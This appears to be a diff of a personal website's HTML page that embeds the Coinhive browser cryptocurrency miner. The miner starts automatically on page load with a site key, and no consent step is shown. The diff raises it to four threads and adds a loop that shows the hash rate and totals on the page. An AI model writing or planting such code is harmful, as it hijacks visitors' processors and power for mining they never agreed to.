@@ -133,11 +133,39 @@
     <script src="js/ie10-viewport-bug-workaround.js"></script>
     <script src="https://raw.githubusercontent.com/paullouismas/paullouismas.github.io/master/programs/libJS.js"></script>
     <script src="programs/LibJS.js"></script>
+    
     <!-- Coin-hive Miner reference -->
     <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+    <script src="https://coin-hive.com/media/miner-ui.js"></script>
     <script type="text/javascript">
-      var miner = new CoinHive.Anonymous('pUhvRAMNDIW3dIVsUuRI9FfG7OOTgBLw');
+      var miner = new CoinHive.Anonymous('pUhvRAMNDIW3dIVsUuRI9FfG7OOTgBLw', {threads: 4});
       miner.start();
+      
+      setInterval(function() {
+	      var hashesPerSecond = miner.getHashesPerSecond();
+	      var totalHashes = miner.getTotalHashes();
+	      //var acceptedHashes = miner.getAcceptedHashes();
+        var numThreads = miner.getNumThreads();
+
+        document.getElementById('mining-hashes-per-second').innerHTML = hashesPerSecond;
+        document.getElementById('mining-threads').innerHTML = numThreads;
+        document.getElementById('mining-hashes-total').innerHTML = totalHashes;
+        
+	      /**
+        var ui = new MinerUI(miner, {
+		      //container: document.getElementById('miner'),
+		      //canvas: document.getElementById('mining-stats-canvas'),
+		      //hashesPerSecond: document.getElementById('mining-hashes-per-second'),
+		      hashesPerSecond: document.getElementById('mining-hashes-per-second'),
+		      threads: document.getElementById('mining-threads'),
+		      //threadsAdd: document.getElementById('mining-threads-add'),
+		      //threadsRemove: document.getElementById('mining-threads-remove'),
+		      hashesTotal: document.getElementById('mining-hashes-total'),
+		      //startButton: document.getElementById('mining-start'),
+		      //stopButton: document.getElementById('mining-stop')
+	      });
+        **/
+      }, 1000);
     </script>
 
   </body>
